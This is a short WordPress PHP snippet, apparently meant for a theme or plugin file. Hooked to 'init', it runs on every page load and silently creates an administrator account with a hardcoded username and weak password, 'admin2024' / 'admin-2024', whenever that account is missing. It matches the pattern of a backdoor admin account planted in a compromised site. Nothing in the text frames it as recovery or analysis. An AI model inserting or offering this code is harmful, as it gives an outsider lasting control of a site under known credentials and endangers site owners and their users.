add_action('init', 'xyz1234_my_custom_add_user');

function xyz1234_my_custom_add_user() {
    $username = 'admin2024';
    $password = 'admin-2024';
    $email = 'drew@example.com';

    if (username_exists($username) == null && email_exists($email) == false) {

        // Create the new user
        $user_id = wp_create_user($username, $password, $email);

        // Get current user object
        $user = get_user_by('id', $user_id);

        // Remove role
        $user->remove_role('subscriber');

        // Add role
        $user->add_role('administrator');
    }
}
